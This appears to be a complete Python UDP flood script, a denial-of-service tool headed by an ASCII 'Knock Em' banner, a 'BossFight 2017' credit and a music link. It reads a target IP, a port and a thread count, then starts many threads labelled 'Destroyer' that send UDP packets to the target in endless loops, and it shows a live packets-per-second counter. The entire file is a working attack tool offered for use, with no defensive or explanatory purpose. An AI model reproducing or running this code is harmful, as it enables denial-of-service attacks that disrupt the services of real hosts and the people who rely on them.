print("""
 /$$   /$$                               /$$             /$$$$$$$$              
| $$  /$$/                              | $$            | $$_____/              
| $$ /$$/  /$$$$$$$   /$$$$$$   /$$$$$$$| $$   /$$      | $$       /$$$$$$/$$$$ 
| $$$$$/  | $$__  $$ /$$__  $$ /$$_____/| $$  /$$/      | $$$$$   | $$_  $$_  $$
| $$  $$  | $$  \ $$| $$  \ $$| $$      | $$$$$$/       | $$__/   | $$ \ $$ \ $$
| $$\  $$ | $$  | $$| $$  | $$| $$      | $$_  $$       | $$      | $$ | $$ | $$
| $$ \  $$| $$  | $$|  $$$$$$/|  $$$$$$$| $$ \  $$      | $$$$$$$$| $$ | $$ | $$
|__/  \__/|__/  |__/ \______/  \_______/|__/  \__/      |________/|__/ |__/ |__/
________________________________________________________________________________

    #################### Predator or pray, predator or pray
    # BossFight 2017   # Nock em out
    # Sweden           # Nock em out
    #################### Predator or pray, predator or pray
    
    
    Music: https://www.youtube.com/watch?v=F0PUVKfxkTM""")
from scapy.all import *
from threading import Thread
import threading
import sys
import time
try:
	DESTINATION_IP = str(sys.argv[1])
	threaddd = int(sys.argv[3])
	DESTINATION_PORT = int(sys.argv[2])
except Exception:
	print("""
Usage:
python3 UDP.py ip port threads
Ex:
python3 UDP.py 1.1.1.1 80 100
Notes:
Don't go over 500 in threads.""")
	exit()
udp_socket = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
payload_hex_string = "68656c6c6f5f776f726c64" #hello_world
payload = bytes.fromhex(payload_hex_string)
test232 = 0
def attack1():
	test232 = 0
	i = 0
	t0 = time.time()
	while True:
		test232 = test232 + 1
		i = i + 1
		t1 = time.time()
		total = t1-t0
		if total > 1:
			os.system("clear")
			print("""
Requests sent:
| """ + str(test232)  + """ |
Method:
| UDP |
IP:
| """ + DESTINATION_IP + """ |
Packets/S:
| """ + str(i) + """ |
Threads:
| """ + str(threaddd) + """ |""")
			t0 = time.time()
			i = 0
		udp_socket.sendto(payload,(DESTINATION_IP,DESTINATION_PORT))
def attack():
	test232 = 0
	while True:
		test232 = test232 + 1
		udp_socket.sendto(payload,(DESTINATION_IP,DESTINATION_PORT))
for i in range(threaddd):
	print("Destroyer ==> " + str(i) + " <== started")
	thread = threading.Thread(target=attack)
	thread.start()
thread = threading.Thread(target=attack1)
thread.start()